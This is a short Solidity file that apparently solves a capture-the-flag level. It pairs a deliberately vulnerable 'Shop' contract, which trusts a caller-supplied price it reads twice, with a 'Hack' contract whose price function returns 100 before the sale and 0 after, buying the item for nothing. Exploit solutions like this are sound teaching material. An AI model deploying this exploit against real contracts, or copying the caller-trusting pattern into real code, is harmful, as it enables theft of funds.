// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Hack is Buyer {
    Shop public shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view override returns (uint) {
        return shop.isSold() ? 0 : 100;
    }

    function attack() external {
        shop.buy();
    }
}
